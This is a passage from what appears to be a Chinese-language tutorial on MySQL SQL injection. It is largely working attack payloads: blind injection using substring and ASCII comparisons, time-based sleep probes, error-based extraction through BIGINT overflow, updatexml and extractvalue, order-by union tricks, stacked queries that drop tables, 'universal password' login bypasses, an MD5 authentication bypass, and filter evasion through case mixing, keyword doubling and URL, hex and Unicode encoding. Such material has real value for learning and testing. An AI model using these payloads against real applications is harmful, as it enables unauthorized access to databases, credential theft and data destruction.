</ul>
<h6 id="MID-函数"><a href="#MID-函数" class="headerlink" title="MID()函数"></a>MID()函数</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(column_name,<span class="keyword">start</span>[,<span class="keyword">length</span>])</span><br></pre></td></tr></table></figure>
<ul>
<li>column_name 必需 要提取字符的字段</li>
<li>start   必需 规定开始位置(起始值是 1)</li>
<li>length    可选 要返回的字符数,如果省略,则 MID()函数返回剩余文本</li>
</ul>
<p>Eg: str=”123456”     mid(str,2,1)    结果为2</p>
<p>用例:</p>
<ol>
<li><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(DATABASE(), 1, 1) &gt; 'a'</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字 符。</p>
<ol start="2">
<li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> T table_schema=<span class="number">0</span>xxxxxxx <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) &gt;<span class="string">'a'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
<h6 id="SUBSTR-函数"><a href="#SUBSTR-函数" class="headerlink" title="SUBSTR()函数"></a>SUBSTR()函数</h6><p>Substr()和substring()函数实现的功能是一样的,均为截取字符串.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string substring(string, <span class="keyword">start</span>, <span class="keyword">length</span>)</span><br><span class="line"><span class="keyword">string</span> <span class="keyword">substr</span>(<span class="keyword">string</span>, <span class="keyword">start</span>, <span class="keyword">length</span>)</span><br></pre></td></tr></table></figure>
<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
<p>用例：</p>
<ol>
<li><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(DATABASE(), 1, 1) &gt; 'a'</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<p>查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
<ol start="2">
<li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> T table_schema=<span class="number">0</span>xxxxxxx <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,    <span class="number">1</span>) &gt; <span class="string">'a'</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
<h6 id="LEFT-函数"><a href="#LEFT-函数" class="headerlink" title="LEFT()函数"></a>LEFT()函数</h6><p>Left()得到字符串左部指定个数的字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Left ( string, n )</span><br></pre></td></tr></table></figure>
<p>string为要截取的字符串,n为长度.</p>
<p>用例：</p>
<ol>
<li><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;'a'</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>查看数据库名第一位</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),2)&gt; 'ab'</span><br></pre></td></tr></table></figure>
<p>查看数据库名前二位。</p>
<ol start="2">
<li><p>同样的string可以为自行构造的sql语句。</p>
<h6 id="ORD-函数"><a href="#ORD-函数" class="headerlink" title="ORD()函数"></a>ORD()函数</h6><p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORD(MID(DATABASE(), 1, 1)) &gt; 114</span><br></pre></td></tr></table></figure>
<p>意为检测database()的第一位ASCII码是否大于114,也即是’r’</p>
<h5 id="构造方式"><a href="#构造方式" class="headerlink" title="构造方式"></a>构造方式</h5><p>字符串函数构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> table_name information_schema.tables <span class="keyword">where</span> tables_schema=<span class="keyword">database</span>()<span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span> <span class="comment">--+        //substr()函数，ascii()函数</span></span><br></pre></td></tr></table></figure>
<p>正则构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">'^[a-z]'</span>;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">user</span>() regexp<span class="string">'^ri'</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">if</span>((<span class="keyword">user</span>() regexp <span class="string">'^r'</span>),<span class="number">1</span>,<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<p>like匹配注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
<p>这个和正则差不多</p>
<h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p>if判断语句，条件为假，执行sleep </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
<p>原理大多类似,要求网速比较好</p>
<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>得到表名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure>
<p>当数字大于BIGINT溢出后mysql会报错, 这里的BIGINT是 !0</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select ~0;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| ~0                   |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure>
<p>然后实验如下:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select (select*from(select user())x);</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br><span class="line">| (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x) |</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br><span class="line">| root@localhost                |</span><br><span class="line">+<span class="comment">-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.006</span> sec)</span><br><span class="line">   </span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">select</span> !(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">| !(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x) |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line">|                              <span class="number">1</span> |</span><br><span class="line">+<span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
<p>因此,只要我们触发溢出错误即可,但是这种方式只适用于较低版本的mysql<br>我的MariaDB做了相关保护:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select !(select*from(select user())x) - ~0;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '!(<span class="keyword">select</span> <span class="comment">#) - ~0'</span></span><br></pre></td></tr></table></figure>
<p>期望的内容被 ‘#’ 代替了.同理,在insert update语句中也可构造溢出:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> <span class="keyword">or</span> !(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)-~<span class="number">0</span> <span class="keyword">or</span> <span class="string">''</span>, <span class="string">'Eyre'</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">'Peter'</span> <span class="keyword">or</span> !(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)-~<span class="number">0</span> <span class="keyword">or</span> <span class="string">''</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">4</span>;</span><br></pre></td></tr></table></figure>
<p>参考文章:<br><a href="http://www.vuln.cn/6818" target="_blank" rel="noopener">BIGINT</a><br><a href="https://www.cnblogs.com/lcamry/p/5763129.html" target="_blank" rel="noopener">Blind Inject</a></p>
</li>
<li><p>order by注入</p>
<ul>
<li>盲注</li>
<li>触发报错</li>
</ul>
<p>&emsp;&emsp;其实原理与上面类似, 首先熟悉一下order by, 他是mysql中对查询数据进行排序的方法,使用示例:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 列名(或者数字) <span class="keyword">asc</span>；升序(默认升序)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 列名(或者数字) <span class="keyword">desc</span>；降序</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span>;</span><br><span class="line">selecr * from user order by 1;</span><br></pre></td></tr></table></figure>
<h6 id="Union盲注"><a href="#Union盲注" class="headerlink" title="Union盲注"></a>Union盲注</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">'select * from admin where username='</span><span class="string">".$username."</span><span class="string">''</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row)&amp;&amp;row[<span class="string">'username'</span>]!=<span class="string">"admin"</span>)&#123;</span><br><span class="line">	$hit=<span class="string">"username error!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ($row[<span class="string">'password'</span>] === $password)&#123;</span><br><span class="line">		$hit=<span class="string">""</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$hit=<span class="string">"password error!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin' union 1,2,'字符串' order by 3	//'</span><br></pre></td></tr></table></figure>
<p>此时sql语句变为:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">binary</span> <span class="string">'字符串'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里就会对第三列进行比较，即将字符串和密码进行比较。然后就可以根据页面返回的不同情况进行盲注。 注意的是最好加上binary，因为order by比较的时候不区分大小写。<br>例如:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from order1;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| 1 | admin | uP10AcB |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">mysql&gt; select * from order1 where username='' or 1 union select 1,2,'v' order by 3;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| 1 | admin | uP10AcB |</span><br><span class="line">| 1 | 2 | v |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from order1 where username='' or 1 union select 1,2,'a' order by 3;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| 1 | 2 | a |</span><br><span class="line">| 1 | admin | uP10AcB |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from order1 where username='' or 1 union select 1,2,'u' order by 3;</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| id | username | password |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br><span class="line">| 1 | 2 | u |</span><br><span class="line">| 1 | admin | uP10AcB |</span><br><span class="line">+<span class="comment">------+----------+----------+</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里的order by 3是根据第三列进行排序，如果我们union查询的字符串比password小的话，我们构造的 1,2,a就会成为第一列，那么在源码对用户名做对比的时候，就会返回username error!，如果union查询的字符串比password大，那么正确的数据就会是第一列，那么页面就会返回password error!.</p>
</li>
</ol>
</li>
</ol>
<h5 id="基于if-盲注"><a href="#基于if-盲注" class="headerlink" title="基于if()盲注"></a>基于if()盲注</h5><p><strong>需要知道列名的情况:</strong><br>&emsp;&emsp;order by的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>
<pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by if(1=1,id,username);</span><br></pre></td></tr></table></figure>
</code></pre><p>&emsp;&emsp;这里如果使用数字代替列名是不行的，因为if语句返回的是<strong>字符类型</strong>,不是整型.</p>
<p><strong>不必知道列名:</strong><br>payload:<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by if(表达式,1,(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> information_schema.tables))</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。</p>
<h6 id="基于时间-1"><a href="#基于时间-1" class="headerlink" title="基于时间"></a>基于时间</h6><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    order by if(1=1,1,sleep(1))</span><br><span class="line">    ```    </span><br><span class="line">测试:</span><br><span class="line">    </span><br><span class="line">    ```sql</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">1</span>)); <span class="comment">#正常时间</span></span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">1</span>)); <span class="comment">#有延迟</span></span><br></pre></td></tr></table></figure>
</code></pre><p>&emsp;&emsp;测试的时候发现延迟的时间并不是sleep(1)中的1秒，而是大于1秒。 最后发现延迟的时间和所查询的数据的条数是成倍数关系的.计算公式:<br>    <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">延迟时间=sleep(1)的秒数*所查询数据条数</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我所测试的表中有四条数据,所以延迟了4秒。如果查询的数据很多时，延迟的时间就会很长了。 在写脚本时，可以添加timeout这一参数来避免延迟时间过长这一情况。</p>
<pre><code>###### 基于rand()的盲注
</code></pre><p>原理与上面类似,看例子:<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ha order by rand(true);</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">| id | name |</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">|  9 | NULL |</span><br><span class="line">|  6 | NULL |</span><br><span class="line">|  5 | NULL |</span><br><span class="line">|  1 | dss  |</span><br><span class="line">|  0 | dasd |</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">mysql&gt; select * from ha order by rand(false);</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">| id | name |</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">|  1 | dss  |</span><br><span class="line">|  6 | NULL |</span><br><span class="line">|  0 | dasd |</span><br><span class="line">|  5 | NULL |</span><br><span class="line">|  9 | NULL |</span><br><span class="line">+<span class="comment">----+------+</span></span><br></pre></td></tr></table></figure></p>
<pre><code>可以看到当rand()为true和false时，排序结果是不同的，所以就可以使用rand()函数构造表达式进行盲注了.
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by rand(ascii(mid((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">96</span>)</span><br></pre></td></tr></table></figure>


###### 基于报错

*updatexml*
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>);<span class="comment">#查询正常</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>);<span class="comment">#查询报错</span></span><br></pre></td></tr></table></figure>


*extractvalue*
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()));<span class="comment">#查询正常</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ha <span class="keyword">order</span> <span class="keyword">by</span> extractvalue(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()));<span class="comment">#查询报错</span></span><br></pre></td></tr></table></figure>
</code></pre><ol start="3">
<li><p>堆叠注入(Stacking Queries)</p>
<p>一句代码之中执行多个查询语句，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> members; <span class="keyword">DROP</span> members <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>支持堆叠查询的语言/数据库<br>绿色：支持，暗灰色：不支持，浅灰色：未知<br><img src="http://drops.xmd5.com/full/7eba77f1e9332de0158f5a1ae5de6ca3a1526df1.jpg" alt="堆叠注入情况"></p>
</li>
</ol>
<ol start="4">
<li><p>万能密码</p>
<ul>
<li>admin’ –   #’</li>
<li>admin’ #    #’</li>
<li>admin’/*      #’</li>
<li>‘ or 1=1–  #’</li>
<li>‘ or 1=1#   #’</li>
<li>‘ or 1=1/*  #’</li>
<li>‘) or ‘1’=’1–    #’</li>
<li><p>‘) or (‘1’=’1–    #’    </p>
<h6 id="绕过检查MD5哈希的登陆界面"><a href="#绕过检查MD5哈希的登陆界面" class="headerlink" title="绕过检查MD5哈希的登陆界面"></a>绕过检查MD5哈希的登陆界面</h6><p>&emsp;&emsp;如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>
<p>绕过MD5哈希检查的例子(MSP)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line"></span><br><span class="line">密码：1234 ' AND 1=0 UNION ALL <span class="keyword">SELECT</span> <span class="string">'admin'</span>,<span class="string">'81dc9bdb52d04dc20036dbd8313ed055</span></span><br><span class="line"><span class="string">// 其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>一些Bypass</p>
<ol>
<li><p>大小写混合<br> 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
<p>举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 </p>
<p>示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p>
</li>
<li><p>替换关键字<br> 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p>
<p>举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</p>
<p>同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p>
</li>
<li><p>使用编码</p>
</li>
</ol>
<ul>
<li><p>URL编码</p>
<p>&emsp;&emsp;在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29<br>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.php?id=1%252f%252a*/UNION%252f%252a /SELECT #</span><br></pre></td></tr></table></figure>
</li>
<li><p>十六进制编码                             </p>
<p>举例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 <span class="comment">/*!u%6eion*/</span> <span class="comment">/*!se%6cect*/</span> 1,2,3,4</span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<p>&emsp;&emsp;示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 </p>
<pre><code>- Unicode编码
</code></pre><p>&emsp;&emsp;Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p>
<p>&emsp;&emsp;看一下常用的几个符号的一些Unicode编码：</p>
<pre><code>单引号: `%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7`

空格: `%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0`

左括号: `%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8`

右括号: `%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9`

举例: `?id=10%D6&apos;%20AND%201=2%23`　　#&apos;
